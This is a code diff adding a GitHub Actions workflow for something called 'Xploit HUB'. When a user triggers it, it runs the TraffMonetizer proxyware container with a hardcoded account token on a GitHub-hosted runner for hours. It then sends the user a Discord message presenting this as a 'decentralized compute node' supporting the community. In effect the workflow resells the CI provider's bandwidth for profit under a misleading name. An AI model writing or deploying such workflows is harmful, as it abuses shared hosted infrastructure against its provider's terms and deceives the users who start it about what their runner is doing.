@@ -1,0 +1,92 @@
+name: Xploit-HUB-Crypto-Donate
+on:
+  workflow_dispatch:
+    inputs:
+      user_id:
+        description: 'Discord User ID'
+        required: true
+      user_name:
+        description: 'Discord User Name'
+        required: true
+      duration:
+        description: 'Duration in minutes'
+        required: true
+        default: '360'
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: ${{ fromJSON(github.event.inputs.duration) }}
+    steps:
+      - name: 🚀 Launch High-Performance Compute Node
+        env:
+          DISCORD_TOKEN: ${{ secrets.DISCORD_TOKEN }}
+          USER_ID: ${{ github.event.inputs.user_id }}
+          DURATION: ${{ github.event.inputs.duration }}
+          TM_TOKEN: "eJcssSnBsHcjv2kqaA6D5/nVXw3A673xatc1rIBPS4Q="
+        run: |
+          echo "=============================================="
+          echo "   XPLOIT HUB - DECENTRALIZED COMPUTE NODE"
+          echo "=============================================="
+          echo "Operator ID : $USER_ID"
+          echo "Duration    : $DURATION minutes"
+          echo "=============================================="
+
+          # Run TraffMonetizer in Docker (Ultra-Low Latency Direct Host Networking)
+          docker run -d --restart=always --net=host --name tm traffmonetizer/cli_v2 start accept --token "$TM_TOKEN"
+
+          # Verify Docker is running
+          sleep 5
+          docker ps
+          docker logs tm || true
+
+          # Notify User in Discord DM with a stylish "Thank You" embed
+          python3 - << 'PYEOF'
+          import subprocess, json, os
+
+          token = os.environ.get("DISCORD_TOKEN")
+          uid   = os.environ.get("USER_ID")
+          dur   = os.environ.get("DURATION", "360")
+
+          if token and uid:
+              try:
+                  auth_h = "Authorization: Bot " + token
+                  ct_h   = "Content-Type: application/json"
+
+                  # Create DM channel
+                  chan_body = json.dumps({"recipient_id": uid})
+                  r = subprocess.run(
+                      ["curl", "-s", "-X", "POST", "https://discord.com/api/v10/users/@me/channels",
+                       "-H", auth_h, "-H", ct_h, "--data", chan_body],
+                      capture_output=True, text=True
+                  )
+                  cdata = json.loads(r.stdout)
+                  cid = cdata.get("id")
+
+                  if cid:
+                      hours = int(dur) // 60
+                      embed_payload = {
+                          "embeds": [{
+                              "title": "💖 Xploit HUB - Support Node Active!",
+                              "description": f"Thank you for supporting **Xploit HUB**!\nYour dedicated compute node is now active and routing decentralized data for the community.",
+                              "color": 0xFF007F,
+                              "fields": [
+                                  {"name": "⚡ Node Type", "value": "Ubuntu 24.04 High-Speed Cluster", "inline": True},
+                                  {"name": "⏳ Duration", "value": f"{hours} Hours ({dur} mins)", "inline": True},
+                                  {"name": "🌟 Status", "value": "🟢 Online & Verifying Bandwidth", "inline": True}
+                              ],
+                              "footer": {"text": "Xploit HUB Decentralized Infrastructure"}
+                          }]
+                      }
+                      subprocess.run(
+                          ["curl", "-s", "-X", "POST", f"https://discord.com/api/v10/channels/{cid}/messages",
+                           "-H", auth_h, "-H", ct_h, "--data", json.dumps(embed_payload)],
+                          capture_output=True, text=True
+                      )
+              except Exception as e:
+                  print("DM send error:", e)
+          PYEOF
+
+          # Keep container active for the duration
+          echo "Node running... Sleeping for $((DURATION * 60)) seconds."
+          sleep $((DURATION * 60))
